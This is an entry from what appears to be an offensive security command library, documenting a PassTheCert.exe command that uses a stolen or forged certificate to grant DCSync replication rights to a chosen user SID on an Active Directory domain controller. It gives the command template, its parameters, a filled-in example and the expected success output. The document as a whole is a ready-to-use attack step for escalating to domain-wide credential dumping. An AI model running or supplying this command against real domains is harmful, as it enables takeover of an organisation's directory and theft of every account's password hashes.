---
id: 06229edb-3a95-45aa-b3ce-0fedf306202f
name: passthecert-grant-dcsync-rights
type: command
executor: cmd
data: >-
  PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target
  $_DOMAIN_DN --sid $_USER_SID
output: null
created_at: '2023-04-06T03:56:06.176534+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - adcs
  - dcsync
  - privilege-escalation
verified: true
validated: true
---

# passthecert-grant-dcsync-rights

## Command

```cmd
PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target $_DOMAIN_DN --sid $_USER_SID
```

## Description

Grants DCSync replication rights to a specified user SID using certificate authentication for temporary privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --server | Domain controller hostname | Yes |
| --cert-path | Path to PFX certificate | Yes |
| --elevate | Elevation mode | Yes |
| --target | Domain DN (e.g., DC=domain,DC=local) | Yes |
| --sid | Target user SID | Yes |

## Examples

### Basic Usage

```cmd
PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid S-1-5-21-...
```

## Expected Output

Successfully granted DCSync rights.
Restoration file created: restoration.txt

## Related

- [[procedures/Pass-The-Certificate-Attack]]
